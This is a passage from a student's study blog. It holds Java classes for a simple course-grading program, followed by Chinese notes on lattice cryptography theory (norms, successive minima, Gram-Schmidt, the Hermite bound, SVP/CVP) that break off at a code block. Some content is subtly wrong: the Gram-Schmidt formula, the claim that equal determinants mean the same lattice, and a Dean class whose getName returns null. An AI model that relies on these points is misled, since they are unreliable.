class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> course;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//课程  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Course</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> ArrayList&lt;Student&gt; <span class="hljs-title function_">getStudents</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> students;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">double</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Student student : students) &#123;  <br>            <span class="hljs-type">Score</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> student.getScores().get(<span class="hljs-built_in">this</span>);  <br>            <span class="hljs-keyword">if</span> (score != <span class="hljs-literal">null</span>) &#123;  <br>                total += score.getScore();  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> total;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAverageScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (students.isEmpty()) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> getTotalScore() / students.size();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>course&#x2F;Score:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> course;  <br><br><span class="hljs-comment">//分数  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Score</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> score;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Score</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-built_in">this</span>.score = <span class="hljs-number">0</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(<span class="hljs-type">double</span> score)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.score = score;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> score;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Person:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-comment">//抽象类  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">protected</span> String name;  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> id;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.id = id;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Dean:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-comment">//院长  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dean</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dean</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name,id);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Student:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> course.Course;  <br><span class="hljs-keyword">import</span> course.Score;  <br><br><span class="hljs-comment">//学生  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> HashMap&lt;Course, Score&gt; scores;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name, id);  <br>        <span class="hljs-built_in">this</span>.scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">enroll</span><span class="hljs-params">(Course course)</span> &#123;  <br>        scores.put(course, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Score</span>());  <br>        course.addStudent(<span class="hljs-built_in">this</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(Course course, <span class="hljs-type">double</span> score)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (scores.containsKey(course)) &#123;  <br>            scores.get(course).setScore(score);  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> Score <span class="hljs-title function_">getScore</span><span class="hljs-params">(Course course)</span> &#123;  <br>        <span class="hljs-keyword">return</span> scores.get(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> HashMap&lt;Course, Score&gt; <span class="hljs-title function_">getScores</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> scores;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">double</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Score score : scores.values()) &#123;  <br>            total += score.getScore();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> total;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAverageScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> getTotalScore() / scores.size();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Teacher:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//老师  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Course&gt; courses;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name, id);  <br>        <span class="hljs-built_in">this</span>.courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assignCourse</span><span class="hljs-params">(Course course)</span> &#123;  <br>        courses.add(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTotalStudents</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Course course : courses) &#123;  <br>            count += course.getStudents().size();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> count;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>app&#x2F;Main:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 主程序  </span><br><span class="hljs-keyword">package</span> app;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> course.Course;  <br><span class="hljs-keyword">import</span> college.College;  <br><span class="hljs-keyword">import</span> college.Department;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">College</span> <span class="hljs-variable">college</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;国家网络安全学院&quot;</span>);  <br>        <span class="hljs-type">Department</span> <span class="hljs-variable">Xinan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;信息安全系&quot;</span>);  <br>        college.addDepartment(Xinan);  <br><br>        <span class="hljs-comment">// 创建教师  </span><br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">teacher1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;张老师&quot;</span>, <span class="hljs-number">1001</span>);  <br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">teacher2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;王老师&quot;</span>,<span class="hljs-number">1002</span>);  <br>        Xinan.addTeacher(teacher1);  <br>        Xinan.addTeacher(teacher2);  <br><br>        <span class="hljs-comment">// 创建课程  </span><br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;计算机组成原理&quot;</span>);  <br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;Java网络程序设计&quot;</span>);  <br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;数据结构&quot;</span>);  <br>        Xinan.addCourse(Course1);  <br>        Xinan.addCourse(Course2);  <br>        Xinan.addCourse(Course3);  <br><br>        teacher1.assignCourse(Course1);  <br>        teacher2.assignCourse(Course2);  <br>        teacher1.assignCourse(Course3);  <br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">2001</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">2002</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;王五&quot;</span>, <span class="hljs-number">2002</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;赵六&quot;</span>, <span class="hljs-number">2002</span>);  <br><br>        Xinan.addStudent(student1);  <br>        Xinan.addStudent(student2);  <br>        Xinan.addStudent(student3);  <br>        Xinan.addStudent(student4);  <br><br>        student1.enroll(Course1);  <br>        student1.enroll(Course2);  <br>        student2.enroll(Course1);  <br>        student3.enroll(Course3);  <br>        student4.enroll(Course3);  <br><br>        student1.setScore(Course1, <span class="hljs-number">85</span>);  <br>        student1.setScore(Course2, <span class="hljs-number">99</span>);  <br>        student2.setScore(Course1, <span class="hljs-number">90</span>);  <br>        student3.setScore(Course3, <span class="hljs-number">88</span>);  <br>        student4.setScore(Course3, <span class="hljs-number">92</span>);  <br><br>        System.out.println(<span class="hljs-string">&quot;计算机组成原理总分: &quot;</span> + Course1.getTotalScore());  <br>        System.out.println(<span class="hljs-string">&quot;计算机组成原理平均分: &quot;</span> + Course1.getAverageScore());  <br><br>        System.out.println(student1.getName() + <span class="hljs-string">&quot; 总分: &quot;</span> + student1.getTotalScore());  <br>        System.out.println(student1.getName() + <span class="hljs-string">&quot; 平均分: &quot;</span> + student1.getAverageScore());  <br><br>        System.out.println(teacher1.getName() + <span class="hljs-string">&quot; 教授的学生总数: &quot;</span> + teacher1.getTotalStudents());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>运行结果：</strong><br><img src="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-03%20212024.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格密码专题学习</title>
    <link href="/2025/04/02/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/04/02/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="格密码专题学习"><a href="#格密码专题学习" class="headerlink" title="格密码专题学习"></a>格密码专题学习</h1><p>最近发现每次做格的题都一知半解格不出来，因此决定从零开始系统学习一下格。</p><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><ul><li><p><strong>基：</strong> 在n维空间中给定的n个线性无关向量：$\vec{b_1},\vec{b_2},…,\vec{b_n}$。</p></li><li><p><strong>格：</strong> 对于n维空间中的基，存在线性组合$x_1\vec{b_1}+x_2\vec{b_2}+…+x_n\vec{b_n}$,其中整系数的线性组合构成的集合成为格，即$x_i\in \mathbb{Z}$，记为</p></li></ul><span>$$  \mathcal{L}(B)=\{x_1\vec{b_1}+x_2\vec{b_2}+...+x_n\vec{b_n},x_i\in\mathbb{Z}\}$$</span>  <p>  <strong>不同的基可能产生同样的格</strong></p><h2 id="二、理论知识点"><a href="#二、理论知识点" class="headerlink" title="二、理论知识点"></a>二、理论知识点</h2><h3 id="格的等价交换"><a href="#格的等价交换" class="headerlink" title="格的等价交换"></a>格的等价交换</h3><ul><li><p><strong>向量交换：</strong> 即$\vec{b_i}\longleftrightarrow\vec{b_j}$</p></li><li><p><strong>向量取反：</strong> 即$\vec{b_i}\longleftrightarrow-\vec{b_i}$</p></li><li><p><strong>整系数线性组合：</strong> 即$\vec{b_i}\longleftrightarrow\vec{b_i}+k\vec{b_j}$ </p><blockquote><p><strong>不同格基产生相同格的条件：</strong> 两个格基矩阵$B_1,B_2$ ,若$B_2&#x3D;B_1U$，（U是幺模矩阵，即行列式的值为±1的矩阵），则两组格基产生的格相同。</p></blockquote></li></ul><h3 id="格的基本区域"><a href="#格的基本区域" class="headerlink" title="格的基本区域"></a>格的基本区域</h3><ul><li><strong>定义：</strong> 格基组成的最小重复单元。</li></ul><h3 id="行列式"><a href="#行列式" class="headerlink" title="行列式"></a>行列式</h3><ul><li><p>再次认识<strong>不同格基产生相同格的条件：</strong> 行列式的值相同。</p></li><li><p><strong>行列式越小，格点密度越大。</strong></p></li></ul><h3 id="延展空间"><a href="#延展空间" class="headerlink" title="延展空间"></a>延展空间</h3><ul><li><p><strong>定义：</strong> 格$\mathcal{L}(B)$中基的所有<strong>线性组合</strong>所形成的<strong>集合</strong>为这组基向量所张成的延展空间。</p><p>即$span(\mathcal{L}(B))&#x3D;span(B)&#x3D;{a_1\vec{b_1}+a_2\vec{b_2}+…+a_n\vec{b_n}|a_i\in\mathbb{R}}$</p></li></ul><h3 id="范数"><a href="#范数" class="headerlink" title="范数"></a>范数</h3><ul><li><strong>$l_1$范数：</strong></li></ul><span>$\|x\|_1=\sum^n_{i=1}|x_i|$</span><ul><li>$l_2$<strong>范数：</strong></li></ul><span> $\|x\|_2=\sqrt{ \sum^n_{i=1}x_i^2}$（欧几里得范数）</span><ul><li>$l_{\infty}$<strong>范数：</strong><br>$|x|_{\infty}&#x3D;max|x_i|$</li></ul><h3 id="Successive-Minima（连续极小）"><a href="#Successive-Minima（连续极小）" class="headerlink" title="Successive Minima（连续极小）"></a>Successive Minima（连续极小）</h3><ul><li><strong>定义：</strong> 在$秩为n的格\mathcal{L}中，第i个连续极小值（i&#x3D;1,2,…,n），$</li></ul><span>$$  \lambda_i=inf\{r|dim(span(\mathcal{L}\cap\mathcal{B}(0,r)))\ge i\}$$</span>  <p>  其中$\lambda_1$是最短非零向量。$inf$指下界。$\mathcal{B}(0,r)$是在零点，半径为$r$的超球体。</p><ul><li><strong>重点：</strong> $\lambda _1$是格$\mathcal{L}$中的最短非零向量的长度</li></ul><h3 id="施密特正交化"><a href="#施密特正交化" class="headerlink" title="施密特正交化"></a>施密特正交化</h3><p><strong>正交化过程：</strong></p><ul><li><p>给定一组<strong>线性无关向量</strong>$b_1,b_2,…,b_n$</p></li><li><p>目标计算得到一组正交基$\tilde b_1,\tilde b_2,…,\tilde b_n$</p></li><li><p>$&lt;b_i,b_j&gt;$表示$b_i$和$b_j$的内积</p></li><li><p>令$\mu_{i,j}&#x3D;\frac{&lt;b_i,b_j&gt;}{&lt;b_j,b_j&gt;}$</p></li><li><p>正交化后的向量表示为</p></li></ul><span>$$\begin{cases}\tilde b_1=b_1 \\\tilde b_2=\mu_{2,1}\tilde b_1 \\\vdots \\\tilde b_i=\sum^{i-1}_{j=1}\mu_{i,j}\tilde b_{j}\end{cases}$$</span><blockquote><p><strong>注意：</strong> 施密特正交化没有限制系数为整数，因此正交化的结果不能直接应用于格基。</p></blockquote><h3 id="QR分解"><a href="#QR分解" class="headerlink" title="QR分解"></a>QR分解</h3><ul><li><p><strong>定义：</strong> 将一个矩阵分解为一个<strong>正交矩阵Q</strong>和一个上<strong>三角矩阵R</strong>的乘积，即 <strong>A&#x3D;QR</strong>。</p></li><li><p><strong>引入：</strong> 对施密特正交化之后的向量进行取整，得到近似正交基$\tilde b_1,\tilde b_2,…,\tilde b_n$</p></li><li><p><strong>矩阵</strong>形式表示：</p></li></ul><span>  $$  \begin{bmatrix}\|\tilde b_1\| & \mu_{2,1}\|\tilde b_1 \| & \cdots & \mu_{n,1}\|\tilde b_1\| \\0 & \|\tilde b_2\| & \cdots & \mu_{n,2}\| b_2\| \\\vdots & \vdots & \ddots & \vdots \\0 & 0 & \cdots & \|\tilde b_n\|\end{bmatrix}  $$  </span><ul><li><p><strong>结论：</strong></p><ul><li><p>$det(B)&#x3D;\Pi^n_{i&#x3D;1}|\tilde b_i|$</p></li><li><p>可以得到$\lambda_1$的下界，即$\lambda_1 \ge min(|\tilde b_i)|$</p></li></ul></li><li><p>不懂，留坑</p></li></ul><h3 id="Hermite定理（赫米特定理）"><a href="#Hermite定理（赫米特定理）" class="headerlink" title="Hermite定理（赫米特定理）"></a>Hermite定理（赫米特定理）</h3><ul><li><p><strong>目的：</strong> 求$\lambda_1$的上界</p></li><li><p><strong>内容：</strong> 对于$n$维格$\mathcal{L}$，都有一个非零向量$\vec{v}\in \mathcal{L}$，满足$|\vec{v}|\le\sqrt{n}det(\mathcal{L})^{\frac{1}{n}}$</p></li></ul><h3 id="高斯启发式"><a href="#高斯启发式" class="headerlink" title="高斯启发式"></a>高斯启发式</h3><ul><li><p><strong>引入：</strong> 对<strong>Hermite定理</strong>的进一步缩小。</p></li><li><p><strong>内容：</strong> 对于$n$维格$\mathcal{L}$，高斯期望的长度为</p></li></ul><span>$$  \sigma(\mathcal{L})=\sqrt{\frac{n}{2\pi e}}det(\mathcal{L})^{\frac{1}{n}}$$</span><ul><li><strong>结论：</strong> 在”随机选择的格“中最短向量满足$|\vec{v}|\approx\sigma(\mathcal{L})$</li></ul><h2 id="三、三大问题"><a href="#三、三大问题" class="headerlink" title="三、三大问题"></a>三、三大问题</h2><h3 id="SVP问题（最短向量问题）"><a href="#SVP问题（最短向量问题）" class="headerlink" title="SVP问题（最短向量问题）"></a>SVP问题（最短向量问题）</h3><ul><li>寻找一个随机格$L$中的最短非零向量，即寻找一个$v\in L$满足$|v|$最小。</li></ul><h3 id="CVP问题（最近向量问题）"><a href="#CVP问题（最近向量问题）" class="headerlink" title="CVP问题（最近向量问题）"></a>CVP问题（最近向量问题）</h3><ul><li>在格$L$中，已知一个不在格点上的向量$w$，寻找一个向量$v\in L$，使得$|w-v|$最小。</li></ul><h3 id="SIVP问题（最短独立向量问题）"><a href="#SIVP问题（最短独立向量问题）" class="headerlink" title="SIVP问题（最短独立向量问题）"></a>SIVP问题（最短独立向量问题）</h3><ul><li>在格$L$中，寻找$n$个线性独立的向量$Bx_1,Bx_2,…,Bx_n$，并且这些向量的长度都小于等于最长的最短向量$\lambda_n$</li></ul><span>$$  max\|Bx_i\| \le \lambda_n$$</span><h2 id="四、格攻击应用"><a href="#四、格攻击应用" class="headerlink" title="四、格攻击应用"></a>四、格攻击应用</h2><h3 id="格基规约算法（LLL-BKZ）"><a href="#格基规约算法（LLL-BKZ）" class="headerlink" title="格基规约算法（LLL,BKZ）"></a>格基规约算法（LLL,BKZ）</h3><h4 id="高斯算法"><a href="#高斯算法" class="headerlink" title="高斯算法"></a>高斯算法</h4><ul><li><p><strong>简介：</strong> 一种原始的<strong>二维</strong>格基规约算法。</p></li><li><p><strong>概念</strong></p><ul><li><p><strong>最小基：</strong> 设$x,y$是<strong>二维格</strong>$L$中的一组基。若$x,y$满足$|x|&#x3D;\lambda_1$(后文均用$|x|$表示向量长度)，且$y$ 与$x$线性无关，则$x,y$为<strong>最小基</strong>（也称<strong>Minkowski约化基</strong>） 。</p></li><li><p><strong>取整：</strong> 记$[\mu]为距\mu最近的整数$。$规定对于整数n，[n+\frac{1}{2}]的值取n。$</p></li></ul></li><li><p><strong>算法步骤：</strong></p><ul><li><p><strong>输入：</strong> $二维格L的一组基x,y，其中|x|&lt;|y|$</p></li><li><p><strong>输出：</strong> $格L中的一组最小基v_1,v_2$</p></li><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span 